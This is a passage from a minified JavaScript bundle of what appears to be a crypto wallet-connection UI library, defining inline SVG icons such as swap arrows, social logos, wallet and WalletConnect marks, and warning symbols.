17.1035 3.09839 17.3818 3.4495C17.9062 4.111 18.0147 4.91815 17.9985 5.74496C17.9827 6.55332 17.8386 7.57903 17.6636 8.82534L17.2701 11.6268C16.9737 13.7376 16.7399 15.4022 16.4432 16.6034C16.2924 17.2135 16.1121 17.7632 15.8678 18.2176C15.6197 18.6794 15.2761 19.0971 14.7777 19.3551C14.1827 19.6632 13.5083 19.7833 12.8436 19.6997C12.2867 19.6297 11.82 19.3563 11.4277 19.0087C11.0415 18.6666 10.6824 18.213 10.3302 17.6925C9.67361 16.722 8.92648 15.342 7.99373 13.603Z"
    clip-rule="evenodd"
  />
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="21"
    height="20"
    viewBox="0 0 21 20"
    fill="none"
  ></svg></svg
>`;var TQ=Object.freeze({__proto__:null,sendSvg:_Q});const $Q=re`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.76.3a1 1 0 0 1 0 1.4L4.07 4.4h9a1 1 0 1 1 0 2h-9l2.69 2.68a1 1 0 1 1-1.42 1.42L.95 6.09a1 1 0 0 1 0-1.4l4.4-4.4a1 1 0 0 1 1.4 0Zm6.49 9.21a1 1 0 0 1 1.41 0l4.39 4.4a1 1 0 0 1 0 1.4l-4.39 4.4a1 1 0 0 1-1.41-1.42l2.68-2.68h-9a1 1 0 0 1 0-2h9l-2.68-2.68a1 1 0 0 1 0-1.42Z"
    clip-rule="evenodd"
  />
</svg>`;var RQ=Object.freeze({__proto__:null,swapHorizontalSvg:$Q});const DQ=re`<svg
  width="14"
  height="14"
  viewBox="0 0 14 14"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M13.7306 3.24213C14.0725 3.58384 14.0725 4.13786 13.7306 4.47957L10.7418 7.46737C10.4 7.80908 9.84581 7.80908 9.50399 7.46737C9.16216 7.12567 9.16216 6.57165 9.50399 6.22994L10.9986 4.73585H5.34082C4.85741 4.73585 4.46553 4.3441 4.46553 3.86085C4.46553 3.3776 4.85741 2.98585 5.34082 2.98585L10.9986 2.98585L9.50399 1.49177C9.16216 1.15006 9.16216 0.596037 9.50399 0.254328C9.84581 -0.0873803 10.4 -0.0873803 10.7418 0.254328L13.7306 3.24213ZM9.52515 10.1352C9.52515 10.6185 9.13327 11.0102 8.64986 11.0102L2.9921 11.0102L4.48669 12.5043C4.82852 12.846 4.82852 13.4001 4.48669 13.7418C4.14487 14.0835 3.59066 14.0835 3.24884 13.7418L0.26003 10.754C0.0958806 10.5899 0.0036621 10.3673 0.00366211 10.1352C0.00366212 9.90318 0.0958806 9.68062 0.26003 9.51652L3.24884 6.52872C3.59066 6.18701 4.14487 6.18701 4.48669 6.52872C4.82851 6.87043 4.82851 7.42445 4.48669 7.76616L2.9921 9.26024L8.64986 9.26024C9.13327 9.26024 9.52515 9.65199 9.52515 10.1352Z"
    fill="currentColor"
  />
</svg>

`;var BQ=Object.freeze({__proto__:null,swapHorizontalMediumSvg:DQ});const LQ=re`<svg width="10" height="10" viewBox="0 0 10 10">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.77986 0.566631C4.0589 0.845577 4.0589 1.29784 3.77986 1.57678L3.08261 2.2738H6.34184C6.73647 2.2738 7.05637 2.5936 7.05637 2.98808C7.05637 3.38257 6.73647 3.70237 6.34184 3.70237H3.08261L3.77986 4.39938C4.0589 4.67833 4.0589 5.13059 3.77986 5.40954C3.50082 5.68848 3.04841 5.68848 2.76937 5.40954L0.852346 3.49316C0.573306 3.21421 0.573306 2.76195 0.852346 2.48301L2.76937 0.566631C3.04841 0.287685 3.50082 0.287685 3.77986 0.566631ZM6.22 4.59102C6.49904 4.31208 6.95145 4.31208 7.23049 4.59102L9.14751 6.5074C9.42655 6.78634 9.42655 7.23861 9.14751 7.51755L7.23049 9.43393C6.95145 9.71287 6.49904 9.71287 6.22 9.43393C5.94096 9.15498 5.94096 8.70272 6.22 8.42377L6.91725 7.72676L3.65802 7.72676C3.26339 7.72676 2.94349 7.40696 2.94349 7.01247C2.94349 6.61798 3.26339 6.29819 3.65802 6.29819L6.91725 6.29819L6.22 5.60117C5.94096 5.32223 5.94096 4.86997 6.22 4.59102Z"
    clip-rule="evenodd"
  />
</svg>`;var UQ=Object.freeze({__proto__:null,swapHorizontalBoldSvg:LQ});const MQ=re`<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="none">
  <path 
    fill="currentColor"
    fill-rule="evenodd" 
    clip-rule="evenodd" 
    d="M8.3071 0.292893C8.69763 0.683417 8.69763 1.31658 8.3071 1.70711L6.41421 3.6H11.3404C13.8368 3.6 16.0533 5.1975 16.8427 7.56588L16.9487 7.88377C17.1233 8.40772 16.8402 8.97404 16.3162 9.14868C15.7923 9.32333 15.226 9.04017 15.0513 8.51623L14.9453 8.19834C14.4281 6.64664 12.976 5.6 11.3404 5.6H6.41421L8.3071 7.49289C8.69763 7.88342 8.69763 8.51658 8.3071 8.90711C7.91658 9.29763 7.28341 9.29763 6.89289 8.90711L3.29289 5.30711C2.90236 4.91658 2.90236 4.28342 3.29289 3.89289L6.89289 0.292893C7.28341 -0.0976311 7.91658 -0.0976311 8.3071 0.292893ZM3.68377 10.8513C4.20771 10.6767 4.77403 10.9598 4.94868 11.4838L5.05464 11.8017C5.57188 13.3534 7.024 14.4 8.65964 14.4L13.5858 14.4L11.6929 12.5071C11.3024 12.1166 11.3024 11.4834 11.6929 11.0929C12.0834 10.7024 12.7166 10.7024 13.1071 11.0929L16.7071 14.6929C17.0976 15.0834 17.0976 15.7166 16.7071 16.1071L13.1071 19.7071C12.7166 20.0976 12.0834 20.0976 11.6929 19.7071C11.3024 19.3166 11.3024 18.6834 11.6929 18.2929L13.5858 16.4L8.65964 16.4C6.16314 16.4 3.94674 14.8025 3.15728 12.4341L3.05131 12.1162C2.87667 11.5923 3.15983 11.026 3.68377 10.8513Z" 
  />
</svg>`;var FQ=Object.freeze({__proto__:null,swapHorizontalRoundedBoldSvg:MQ});const zQ=re`<svg fill="none" viewBox="0 0 14 14">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.48 2.18a1 1 0 0 1 1.41 0l2.68 2.68a1 1 0 1 1-1.41 1.42l-.98-.98v4.56a1 1 0 0 1-2 0V5.3l-.97.98A1 1 0 0 1 .79 4.86l2.69-2.68Zm6.34 2.93a1 1 0 0 1 1 1v4.56l.97-.98a1 1 0 1 1 1.42 1.42l-2.69 2.68a1 1 0 0 1-1.41 0l-2.68-2.68a1 1 0 0 1 1.41-1.42l.98.98V6.1a1 1 0 0 1 1-1Z"
    clip-rule="evenodd"
  />
</svg>`;var jQ=Object.freeze({__proto__:null,swapVerticalSvg:zQ});const HQ=re`<svg width="32" height="32" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
  <g clip-path="url(#a)">
    <path fill="url(#b)" d="M0 0h32v32H0z"/>
    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.034 15.252c4.975-2.167 8.293-3.596 9.953-4.287 4.74-1.971 5.725-2.314 6.366-2.325.142-.002.457.033.662.198.172.14.22.33.243.463.022.132.05.435.028.671-.257 2.7-1.368 9.248-1.933 12.27-.24 1.28-.71 1.708-1.167 1.75-.99.091-1.743-.655-2.703-1.284-1.502-.985-2.351-1.598-3.81-2.558-1.684-1.11-.592-1.721.368-2.718.252-.261 4.619-4.233 4.703-4.594.01-.045.02-.213-.08-.301-.1-.09-.246-.059-.353-.035-.15.034-2.55 1.62-7.198 4.758-.682.468-1.298.696-1.851.684-.61-.013-1.782-.344-2.653-.628-1.069-.347-1.918-.53-1.845-1.12.039-.308.462-.623 1.27-.944Z" fill="#fff"/>
  </g>
  <path d="M.5 16C.5 7.44 7.44.5 16 .5 24.56.5 31.5 7.44 31.5 16c0 8.56-6.94 15.5-15.5 15.5C7.44 31.5.5 24.56.5 16Z" stroke="#141414" stroke-opacity=".05"/>
  <defs>
    <linearGradient id="b" x1="1600" y1="0" x2="1600" y2="3176.27" gradientUnits="userSpaceOnUse">
      <stop stop-color="#2AABEE"/>
      <stop offset="1" stop-color="#229ED9"/>
    </linearGradient>
    <clipPath id="a">
      <path d="M0 16C0 7.163 7.163 0 16 0s16 7.163 16 16-7.163 16-16 16S0 24.837 0 16Z" fill="#fff"/>
    </clipPath>
  </defs>
</svg>`;var qQ=Object.freeze({__proto__:null,telegramSvg:HQ});const VQ=re`<svg width="14" height="15" viewBox="0 0 14 15" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M7 3.71875C6.0335 3.71875 5.25 2.93525 5.25 1.96875C5.25 1.00225 6.0335 0.21875 7 0.21875C7.9665 0.21875 8.75 1.00225 8.75 1.96875C8.75 2.93525 7.9665 3.71875 7 3.71875Z" fill="#949E9E"/>
  <path d="M7 8.96875C6.0335 8.96875 5.25 8.18525 5.25 7.21875C5.25 6.25225 6.0335 5.46875 7 5.46875C7.9665 5.46875 8.75 6.25225 8.75 7.21875C8.75 8.18525 7.9665 8.96875 7 8.96875Z" fill="#949E9E"/>
  <path d="M5.25 12.4688C5.25 13.4352 6.0335 14.2187 7 14.2187C7.9665 14.2187 8.75 13.4352 8.75 12.4688C8.75 11.5023 7.9665 10.7188 7 10.7188C6.0335 10.7188 5.25 11.5023 5.25 12.4688Z" fill="#949E9E"/>
</svg>`;var WQ=Object.freeze({__proto__:null,threeDotsSvg:VQ});const GQ=re`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#5A3E85" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M18.22 25.7 20 23.91h3.34l2.1-2.1v-6.68H15.4v8.78h2.82v1.77Zm3.87-8.16h1.25v3.66H22.1v-3.66Zm-3.34 0H20v3.66h-1.25v-3.66ZM20 7.9a12 12 0 1 0 0 24 12 12 0 0 0 0-24Zm6.69 14.56-3.66 3.66h-2.72l-1.77 1.78h-1.88V26.1H13.3v-9.82l.94-2.4H26.7v8.56Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`;var KQ=Object.freeze({__proto__:null,twitchSvg:GQ});const ZQ=re`<svg fill="none" viewBox="0 0 41 40">
  <g clip-path="url(#a)">
    <path fill="#000" d="M.8 0h40v40H.8z" />
    <path
      fill="#fff"
      d="m22.63 18.46 7.14-8.3h-1.69l-6.2 7.2-4.96-7.2H11.2l7.5 10.9-7.5 8.71h1.7l6.55-7.61 5.23 7.61h5.72l-7.77-11.31Zm-9.13-7.03h2.6l11.98 17.13h-2.6L13.5 11.43Z"
    />
  </g>
  <defs>
    <clipPath id="a"><path fill="#fff" d="M.8 20a20 20 0 1 1 40 0 20 20 0 0 1-40 0Z" /></clipPath>
  </defs>
</svg>`;var R8=Object.freeze({__proto__:null,xSvg:ZQ});const JQ=re`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="m14.36 4.74.01.42c0 4.34-3.3 9.34-9.34 9.34A9.3 9.3 0 0 1 0 13.03a6.6 6.6 0 0 0 4.86-1.36 3.29 3.29 0 0 1-3.07-2.28c.5.1 1 .07 1.48-.06A3.28 3.28 0 0 1 .64 6.11v-.04c.46.26.97.4 1.49.41A3.29 3.29 0 0 1 1.11 2.1a9.32 9.32 0 0 0 6.77 3.43 3.28 3.28 0 0 1 5.6-3 6.59 6.59 0 0 0 2.08-.8 3.3 3.3 0 0 1-1.45 1.82A6.53 6.53 0 0 0 16 3.04c-.44.66-1 1.23-1.64 1.7Z"
  />
</svg>`;var QQ=Object.freeze({__proto__:null,twitterIconSvg:JQ});const YQ=re`<svg fill="none" viewBox="0 0 28 28">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M18.1 4.76c-.42-.73-1.33-1.01-2.09-.66l-1.42.66c-.37.18-.8.18-1.18 0l-1.4-.65a1.63 1.63 0 0 0-2.1.66l-.84 1.45c-.2.34-.53.59-.92.67l-1.7.35c-.83.17-1.39.94-1.3 1.78l.19 1.56c.04.39-.08.78-.33 1.07l-1.12 1.3c-.52.6-.52 1.5 0 2.11L5 16.38c.25.3.37.68.33 1.06l-.18 1.57c-.1.83.46 1.6 1.28 1.78l1.7.35c.4.08.73.32.93.66l.84 1.43a1.63 1.63 0 0 0 2.09.66l1.41-.66c.37-.17.8-.17 1.18 0l1.43.67c.76.35 1.66.07 2.08-.65l.86-1.45c.2-.34.54-.58.92-.66l1.68-.35A1.63 1.63 0 0 0 22.84 19l-.18-1.57a1.4 1.4 0 0 1 .33-1.06l1.12-1.32c.52-.6.52-1.5 0-2.11l-1.12-1.3a1.4 1.4 0 0 1-.33-1.07l.18-1.57c.1-.83-.46-1.6-1.28-1.77l-1.68-.35a1.4 1.4 0 0 1-.92-.66l-.86-1.47Zm-3.27-3.2a4.43 4.43 0 0 1 5.69 1.78l.54.93 1.07.22a4.43 4.43 0 0 1 3.5 4.84l-.11.96.7.83a4.43 4.43 0 0 1 .02 5.76l-.72.85.1.96a4.43 4.43 0 0 1-3.5 4.84l-1.06.22-.54.92a4.43 4.43 0 0 1-5.68 1.77l-.84-.4-.82.39a4.43 4.43 0 0 1-5.7-1.79l-.51-.89-1.09-.22a4.43 4.43 0 0 1-3.5-4.84l.1-.96-.72-.85a4.43 4.43 0 0 1 .01-5.76l.71-.83-.1-.95a4.43 4.43 0 0 1 3.5-4.84l1.08-.23.53-.9a4.43 4.43 0 0 1 5.7-1.8l.81.38.83-.39ZM18.2 9.4c.65.42.84 1.28.42 1.93l-4.4 6.87a1.4 1.4 0 0 1-2.26.14L9.5 15.39a1.4 1.4 0 0 1 2.15-1.8l1.23 1.48 3.38-5.26a1.4 1.4 0 0 1 1.93-.42Z"
    clip-rule="evenodd"
  />
</svg>`;var XQ=Object.freeze({__proto__:null,verifySvg:YQ});const eY=re`<svg fill="none" viewBox="0 0 14 14">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="m4.1 12.43-.45-.78-.93-.2a1.65 1.65 0 0 1-1.31-1.8l.1-.86-.61-.71a1.65 1.65 0 0 1 0-2.16l.6-.7-.09-.85c-.1-.86.47-1.64 1.3-1.81l.94-.2.45-.78A1.65 1.65 0 0 1 6.23.9l.77.36.78-.36c.77-.36 1.69-.07 2.12.66l.47.8.91.2c.84.17 1.4.95 1.31 1.8l-.1.86.6.7c.54.62.54 1.54.01 2.16l-.6.71.09.86c.1.85-.47 1.63-1.3 1.8l-.92.2-.47.79a1.65 1.65 0 0 1-2.12.66L7 12.74l-.77.36c-.78.35-1.7.07-2.13-.67Zm5.74-6.9a1 1 0 1 0-1.68-1.07L6.32 7.3l-.55-.66a1 1 0 0 0-1.54 1.28l1.43 1.71a1 1 0 0 0 1.61-.1l2.57-4Z"
    clip-rule="evenodd"
  />
</svg>`;var tY=Object.freeze({__proto__:null,verifyFilledSvg:eY});const rY=re`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 5.5c0-1.8 1.46-3.25 3.25-3.25H14.5c1.8 0 3.25 1.46 3.25 3.25v.28A3.25 3.25 0 0 1 20 8.88v2.24c0 1.45-.94 2.68-2.25 3.1v.28c0 1.8-1.46 3.25-3.25 3.25H3.25A3.25 3.25 0 0 1 0 14.5v-9Zm15.75 8.88h-2.38a4.38 4.38 0 0 1 0-8.76h2.38V5.5c0-.69-.56-1.25-1.25-1.25H3.25C2.56 4.25 2 4.81 2 5.5v9c0 .69.56 1.25 1.25 1.25H14.5c.69 0 1.25-.56 1.25-1.25v-.13Zm-2.38-6.76a2.37 2.37 0 1 0 0 4.75h3.38c.69 0 1.25-.55 1.25-1.24V8.87c0-.69-.56-1.24-1.25-1.24h-3.38Z"
    clip-rule="evenodd"
  />
</svg>`;var nY=Object.freeze({__proto__:null,walletSvg:rY});const iY=re`<svg fill="none" viewBox="0 0 96 67">
  <path
    fill="currentColor"
    d="M25.32 18.8a32.56 32.56 0 0 1 45.36 0l1.5 1.47c.63.62.63 1.61 0 2.22l-5.15 5.05c-.31.3-.82.3-1.14 0l-2.07-2.03a22.71 22.71 0 0 0-31.64 0l-2.22 2.18c-.31.3-.82.3-1.14 0l-5.15-5.05a1.55 1.55 0 0 1 0-2.22l1.65-1.62Zm56.02 10.44 4.59 4.5c.63.6.63 1.6 0 2.21l-20.7 20.26c-.62.61-1.63.61-2.26 0L48.28 41.83a.4.4 0 0 0-.56 0L33.03 56.21c-.63.61-1.64.61-2.27 0L10.07 35.95a1.55 1.55 0 0 1 0-2.22l4.59-4.5a1.63 1.63 0 0 1 2.27 0L31.6 43.63a.4.4 0 0 0 .57 0l14.69-14.38a1.63 1.63 0 0 1 2.26 0l14.69 14.38a.4.4 0 0 0 .57 0l14.68-14.38a1.63 1.63 0 0 1 2.27 0Z"
  />
  <path
    stroke="#000"
    stroke-opacity=".1"
    d="M25.67 19.15a32.06 32.06 0 0 1 44.66 0l1.5 1.48c.43.42.43 1.09 0 1.5l-5.15 5.05a.31.31 0 0 1-.44 0l-2.07-2.03a23.21 23.21 0 0 0-32.34 0l-2.22 2.18a.31.31 0 0 1-.44 0l-5.15-5.05a1.05 1.05 0 0 1 0-1.5l1.65-1.63ZM81 29.6l4.6 4.5c.42.41.42 1.09 0 1.5l-20.7 20.26c-.43.43-1.14.43-1.57 0L48.63 41.47a.9.9 0 0 0-1.26 0L32.68 55.85c-.43.43-1.14.43-1.57 0L10.42 35.6a1.05 1.05 0 0 1 0-1.5l4.59-4.5a1.13 1.13 0 0 1 1.57 0l14.68 14.38a.9.9 0 0 0 1.27 0l-.35-.35.35.35L47.22 29.6a1.13 1.13 0 0 1 1.56 0l14.7 14.38a.9.9 0 0 0 1.26 0L79.42 29.6a1.13 1.13 0 0 1 1.57 0Z"
  />
</svg>`,sY=re`
<svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<g clip-path="url(#clip0_22274_4692)">
<path d="M0 6.64C0 4.17295 0 2.93942 0.525474 2.01817C0.880399 1.39592 1.39592 0.880399 2.01817 0.525474C2.93942 0 4.17295 0 6.64 0H9.36C11.8271 0 13.0606 0 13.9818 0.525474C14.6041 0.880399 15.1196 1.39592 15.4745 2.01817C16 2.93942 16 4.17295 16 6.64V9.36C16 11.8271 16 13.0606 15.4745 13.9818C15.1196 14.6041 14.6041 15.1196 13.9818 15.4745C13.0606 16 11.8271 16 9.36 16H6.64C4.17295 16 2.93942 16 2.01817 15.4745C1.39592 15.1196 0.880399 14.6041 0.525474 13.9818C0 13.0606 0 11.8271 0 9.36V6.64Z" fill="#C7B994"/>
<path d="M4.49038 5.76609C6.42869 3.86833 9.5713 3.86833 11.5096 5.76609L11.7429 5.99449C11.8398 6.08938 11.8398 6.24323 11.7429 6.33811L10.9449 7.11942C10.8964 7.16686 10.8179 7.16686 10.7694 7.11942L10.4484 6.80512C9.09617 5.48119 6.90381 5.48119 5.5516 6.80512L5.20782 7.14171C5.15936 7.18915 5.08079 7.18915 5.03234 7.14171L4.23434 6.3604C4.13742 6.26552 4.13742 6.11167 4.23434 6.01678L4.49038 5.76609ZM13.1599 7.38192L13.8702 8.07729C13.9671 8.17217 13.9671 8.32602 13.8702 8.4209L10.6677 11.5564C10.5708 11.6513 10.4137 11.6513 10.3168 11.5564L8.04388 9.33105C8.01965 9.30733 7.98037 9.30733 7.95614 9.33105L5.6833 11.5564C5.58638 11.6513 5.42925 11.6513 5.33234 11.5564L2.12982 8.42087C2.0329 8.32598 2.0329 8.17213 2.12982 8.07724L2.84004 7.38188C2.93695 7.28699 3.09408 7.28699 3.191 7.38188L5.46392 9.60726C5.48815 9.63098 5.52743 9.63098 5.55166 9.60726L7.82447 7.38188C7.92138 7.28699 8.07851 7.28699 8.17543 7.38187L10.4484 9.60726C10.4726 9.63098 10.5119 9.63098 10.5361 9.60726L12.809 7.38192C12.9059 7.28703 13.063 7.28703 13.1599 7.38192Z" fill="#202020"/>
</g>
<defs>
<clipPath id="clip0_22274_4692">
<path d="M0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8Z" fill="white"/>
</clipPath>
</defs>
</svg>
`,oY=re`
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="11" cy="11" r="11" transform="matrix(-1 0 0 1 23 1)" fill="#202020"/>
<circle cx="11" cy="11" r="11.5" transform="matrix(-1 0 0 1 23 1)" stroke="#C7B994" stroke-opacity="0.7"/>
<path d="M15.4523 11.0686L16.7472 9.78167C13.8205 6.87297 10.1838 6.87297 7.25708 9.78167L8.55201 11.0686C10.7779 8.85645 13.2279 8.85645 15.4538 11.0686H15.4523Z" fill="#C7B994"/>
<path d="M15.0199 14.067L12 11.0656L8.98 14.067L5.96004 11.0656L4.66663 12.3511L8.98 16.6393L12 13.638L15.0199 16.6393L19.3333 12.3511L18.0399 11.0656L15.0199 14.067Z" fill="#C7B994"/>
</svg>
`;var bm=Object.freeze({__proto__:null,walletConnectSvg:iY,walletConnectLightBrownSvg:sY,walletConnectBrownSvg:oY});const aY=re`
  <svg fill="none" viewBox="0 0 48 44">
    <path
      style="fill: var(--wui-color-bg-300);"
      d="M4.56 8.64c-1.23 1.68-1.23 4.08-1.23 8.88v8.96c0 4.8 0 7.2 1.23 8.88.39.55.87 1.02 1.41 1.42C7.65 38 10.05 38 14.85 38h14.3c4.8 0 7.2 0 8.88-1.22a6.4 6.4 0 0 0 1.41-1.42c.83-1.14 1.1-2.6 1.19-4.92a6.4 6.4 0 0 0 5.16-4.65c.21-.81.21-1.8.21-3.79 0-1.98 0-2.98-.22-3.79a6.4 6.4 0 0 0-5.15-4.65c-.1-2.32-.36-3.78-1.19-4.92a6.4 6.4 0 0 0-1.41-1.42C36.35 6 33.95 6 29.15 6h-14.3c-4.8 0-7.2 0-8.88 1.22a6.4 6.4 0 0 0-1.41 1.42Z"
    />
    <path
      style="fill: var(--wui-color-fg-200);"
      fill-rule="evenodd"
      d="M2.27 11.33a6.4 6.4 0 0 1 6.4-6.4h26.66a6.4 6.4 0 0 1 6.4 6.4v1.7a6.4 6.4 0 0 1 5.34 6.3v5.34a6.4 6.4 0 0 1-5.34 6.3v1.7a6.4 6.4 0 0 1-6.4 6.4H8.67a6.4 6.4 0 0 1-6.4-6.4V11.33ZM39.6 31.07h-6.93a9.07 9.07 0 1 1 0-18.14h6.93v-1.6a4.27 4.27 0 0 0-4.27-4.26H8.67a4.27 4.27 0 0 0-4.27 4.26v21.34a4.27 4.27 0 0 0 4.27 4.26h26.66a4.27 4.27 0 0 0 4.27-4.26v-1.6Zm-6.93-16a6.93 6.93 0 0 0 0 13.86h8a4.27 4.27 0 0 0 4.26-4.26v-5.34a4.27 4.27 0 0 0-4.26-4.26h-8Z"
      clip-rule="evenodd"
    />
  </svg>
`;var cY=Object.freeze({__proto__:null,walletPlaceholderSvg:aY});const lY=re`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    d="M11 6.67a1 1 0 1 0-2 0v2.66a1 1 0 0 0 2 0V6.67ZM10 14.5a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5Z"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M10 1a9 9 0 1 0 0 18 9 9 0 0 0 0-18Zm-7 9a7 7 0 1 1 14 0 7 7 0 0 1-14 0Z"
    clip-rule="evenodd"
  />
</svg>`;var uY=Object.freeze({__proto__:null,warningCircleSvg:lY});const hY=re`<svg width="22" height="22" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M9.125 6.875C9.125 6.57833 9.21298 6.28832 9.3778 6.04165C9.54262 5.79497 9.77689 5.60271 10.051 5.48918C10.3251 5.37565 10.6267 5.34594 10.9176 5.40382C11.2086 5.4617 11.4759 5.60456 11.6857 5.81434C11.8954 6.02412 12.0383 6.29139 12.0962 6.58236C12.1541 6.87334 12.1244 7.17494 12.0108 7.44903C11.8973 7.72311 11.705 7.95738 11.4584 8.1222C11.2117 8.28703 10.9217 8.375 10.625 8.375C10.2272 8.375 9.84565 8.21696 9.56434 7.93566C9.28304 7.65436 9.125 7.27282 9.125 6.875ZM21.125 11C21.125 13.0025 20.5312 14.9601 19.4186 16.6251C18.3061 18.2902 16.7248 19.5879 14.8747 20.3543C13.0246 21.1206 10.9888 21.3211 9.02471 20.9305C7.06066 20.5398 5.25656 19.5755 3.84055 18.1595C2.42454 16.7435 1.46023 14.9393 1.06955 12.9753C0.678878 11.0112 0.879387 8.97543 1.64572 7.12533C2.41206 5.27523 3.70981 3.69392 5.37486 2.58137C7.0399 1.46882 8.99747 0.875 11 0.875C13.6844 0.877978 16.258 1.94567 18.1562 3.84383C20.0543 5.74199 21.122 8.3156 21.125 11ZM18.875 11C18.875 9.44247 18.4131 7.91992 17.5478 6.62488C16.6825 5.32985 15.4526 4.32049 14.0136 3.72445C12.5747 3.12841 10.9913 2.97246 9.46367 3.27632C7.93607 3.58017 6.53288 4.3302 5.43154 5.43153C4.3302 6.53287 3.58018 7.93606 3.27632 9.46366C2.97246 10.9913 3.12841 12.5747 3.72445 14.0136C4.32049 15.4526 5.32985 16.6825 6.62489 17.5478C7.91993 18.4131 9.44248 18.875 11 18.875C13.0879 18.8728 15.0896 18.0424 16.566 16.566C18.0424 15.0896 18.8728 13.0879 18.875 11ZM12.125 14.4387V11.375C12.125 10.8777 11.9275 10.4008 11.5758 10.0492C11.2242 9.69754 10.7473 9.5 10.25 9.5C9.98433 9.4996 9.72708 9.59325 9.52383 9.76435C9.32058 9.93544 9.18444 10.173 9.13952 10.4348C9.09461 10.6967 9.14381 10.966 9.27843 11.195C9.41304 11.4241 9.62438 11.5981 9.875 11.6863V14.75C9.875 15.2473 10.0725 15.7242 10.4242 16.0758C10.7758 16.4275 11.2527 16.625 11.75 16.625C12.0157 16.6254 12.2729 16.5318 12.4762 16.3607C12.6794 16.1896 12.8156 15.952 12.8605 15.6902C12.9054 15.4283 12.8562 15.159 12.7216 14.93C12.587 14.7009 12.3756 14.5269 12.125 14.4387Z" fill="currentColor"/>
</svg>`;var dY=Object.freeze({__proto__:null,infoSvg:hY});const fY=re`<svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M15.0162 11.6312L9.55059 2.13937C9.39228 1.86862 9.16584 1.64405 8.8938 1.48798C8.62176 1.33192 8.3136 1.2498 7.99997 1.2498C7.68634 1.2498 7.37817 1.33192 7.10613 1.48798C6.83409 1.64405 6.60765 1.86862 6.44934 2.13937L0.983716 11.6312C0.830104 11.894 0.749146 12.1928 0.749146 12.4972C0.749146 12.8015 0.830104 13.1004 0.983716 13.3631C1.14027 13.6352 1.3664 13.8608 1.63889 14.0166C1.91139 14.1725 2.22044 14.253 2.53434 14.25H13.4656C13.7793 14.2528 14.0881 14.1721 14.3603 14.0163C14.6326 13.8604 14.8585 13.635 15.015 13.3631C15.1688 13.1005 15.2499 12.8017 15.2502 12.4973C15.2504 12.193 15.1696 11.8941 15.0162 11.6312ZM13.7162 12.6125C13.6908 12.6558 13.6541 12.6914 13.6101 12.7157C13.5661 12.7399 13.5164 12.7517 13.4662 12.75H2.53434C2.48415 12.7517 2.43442 12.7399 2.39042 12.7157C2.34641 12.6914 2.30976 12.6558 2.28434 12.6125C2.26278 12.5774 2.25137 12.5371 2.25137 12.4959C2.25137 12.4548 2.26278 12.4144 2.28434 12.3794L7.74997 2.88749C7.77703 2.84583 7.81408 2.8116 7.85774 2.7879C7.9014 2.7642 7.95029 2.75178 7.99997 2.75178C8.04964 2.75178 8.09854 2.7642 8.1422 2.7879C8.18586 2.8116 8.2229 2.84583 8.24997 2.88749L13.715 12.3794C13.7367 12.4143 13.7483 12.4546 13.7486 12.4958C13.7488 12.5369 13.7376 12.5773 13.7162 12.6125ZM7.24997 8.49999V6.49999C7.24997 6.30108 7.32898 6.11031 7.46964 5.96966C7.61029 5.82901 7.80105 5.74999 7.99997 5.74999C8.19888 5.74999 8.38964 5.82901 8.5303 5.96966C8.67095 6.11031 8.74997 6.30108 8.74997 6.49999V8.49999C8.74997 8.6989 8.67095 8.88967 8.5303 9.03032C8.38964 9.17097 8.19888 9.24999 7.99997 9.24999C7.80105 9.24999 7.61029 9.17097 7.46964 9.03032C7.32898 8.88967 7.24997 8.6989 7.24997 8.49999ZM8.99997 11C8.99997 11.1978 8.94132 11.3911 8.83144 11.5556C8.72155 11.72 8.56538 11.8482 8.38265 11.9239C8.19992 11.9996 7.99886 12.0194 7.80488 11.9808C7.6109 11.9422 7.43271 11.847 7.29286 11.7071C7.15301 11.5672 7.05777 11.3891 7.01918 11.1951C6.9806 11.0011 7.0004 10.8 7.07609 10.6173C7.15177 10.4346 7.27995 10.2784 7.4444 10.1685C7.60885 10.0586 7.80219 9.99999 7.99997 9.99999C8.26518 9.99999 8.51954 10.1053 8.70707 10.2929C8.89461 10.4804 8.99997 10.7348 8.99997 11Z" fill="currentColor"/>
</svg>
`;var pY=Object.freeze({__proto__:null,exclamationTriangleSvg:fY});const gY=re`<svg width="60" height="16" viewBox="0 0 60 16" fill="none"">
